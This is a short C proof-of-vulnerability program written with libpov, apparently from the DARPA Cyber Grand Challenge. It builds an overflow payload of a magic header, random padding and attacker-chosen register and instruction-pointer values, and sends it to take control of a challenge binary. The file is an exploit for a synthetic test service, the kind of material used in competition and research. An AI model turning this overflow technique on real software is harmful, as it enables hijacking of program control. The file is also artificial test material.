#include <libpov.h>

int main()
{
    unsigned char *payload = NULL, *buf;
    unsigned int payload_len = 0;
    size_t bytes;

    negotiate_type1(0xfefefefe, 0xfefefefe, 3);

    payload = append_buf(payload, &payload_len, (unsigned char *)"\x00\x00\x80\x0c\x06\x67\xff\xff\xff\xff", 10);

    buf = __libpov_malloc(264);
    random(buf, 264, &bytes);
    payload = append_buf(payload, &payload_len, buf, 264);
    __libpov_free(buf);

    payload = append_var("TYPE1_REG", payload, &payload_len);
    payload = append_var("TYPE1_IP", payload, &payload_len);

    buf = __libpov_malloc(0x8000);
    random(buf, 0x8000, &bytes);
    payload = append_buf(payload, &payload_len, buf, 0x8000 - 264 - 8 + 6);
    __libpov_free(buf);

    transmit_all(1, payload, payload_len);
    __libpov_free(payload);
}
